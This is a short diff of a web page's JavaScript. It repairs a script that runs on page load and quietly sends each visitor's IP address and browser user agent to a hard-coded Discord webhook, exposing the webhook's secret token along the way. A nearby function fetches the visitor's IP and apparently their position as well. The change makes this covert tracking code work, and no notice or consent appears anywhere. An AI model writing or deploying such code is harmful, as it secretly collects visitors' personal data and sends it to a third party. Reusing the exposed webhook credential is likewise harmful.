@@ -290,8 +290,9 @@ document.addEventListener('DOMContentLoaded', () => {
         await fetch("https://discord.com/api/webhooks/1507506807726280836/gYcSNU1ui5DuzGIVe5xFD-hY2s1RshhCwf2Opt5CdKDbs7Y_Qm4Db5hya4t0d8GFnbLW",{
             method:"POST",
             headers:{"Content-Type":"application/json"},
-            body: JSON.stringify({content:`CLICK!!\nIP: ${ip2}\nUser-Agent: ${navigator.userAgent}\n====EOF====`});
-        })()
+            body: JSON.stringify({content:`CLICK!!\nIP: ${ip2}\nUser-Agent: ${navigator.userAgent}\n====EOF====`})
+        })
+    })();
     async function sucesso(posicao) {
     const res = await fetch("https://httpbin.org/ip");
     const res2 = await res.json();
